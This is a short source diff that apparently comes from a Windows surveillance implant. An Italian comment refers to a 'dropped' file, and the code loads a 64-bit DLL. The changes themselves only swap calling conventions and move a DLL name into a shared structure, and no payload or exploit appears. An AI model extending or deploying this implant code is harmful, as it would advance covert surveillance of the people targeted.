@@ -3,13 +3,14 @@
 #include "HM_SafeProcedures.h"
 #include "H4-DLL.h"
 #include "common.h"
+#include "bss.h"
 
-typedef void (__stdcall *Sleep_t)(DWORD);
+typedef void (WINAPI *Sleep_t)(DWORD);
 
-typedef BOOL (__stdcall *IsWow64Process_PROC)(HANDLE, BOOL*);
-typedef void (__stdcall *GetNativeSystemInfo_PROC)(LPSYSTEM_INFO);
-typedef BOOL (__stdcall *Wow64DisableWow64FsRedirection_PROC)(PVOID *OldValue);
-typedef BOOL (__stdcall *Wow64RevertWow64FsRedirection_PROC)(PVOID OldValue);
+typedef BOOL (WINAPI *IsWow64Process_PROC)(HANDLE, BOOL*);
+typedef void (WINAPI *GetNativeSystemInfo_PROC)(LPSYSTEM_INFO);
+typedef BOOL (WINAPI *Wow64DisableWow64FsRedirection_PROC)(PVOID *OldValue);
+typedef BOOL (WINAPI *Wow64RevertWow64FsRedirection_PROC)(PVOID OldValue);
 
 extern BOOL IsMyProcess(DWORD pid);
 
@@ -163,7 +164,7 @@ void Run64Core()
 		return;
 
 	// Se il file non e' stato droppato, non cerca di caricarlo
-	HM_CompletePath(H64DLL_NAME, dll64_path);
+	HM_CompletePath(shared.H64DLL_NAME, dll64_path);
 	hfile = CreateFileA(dll64_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
 	if (hfile == INVALID_HANDLE_VALUE)
 		return;
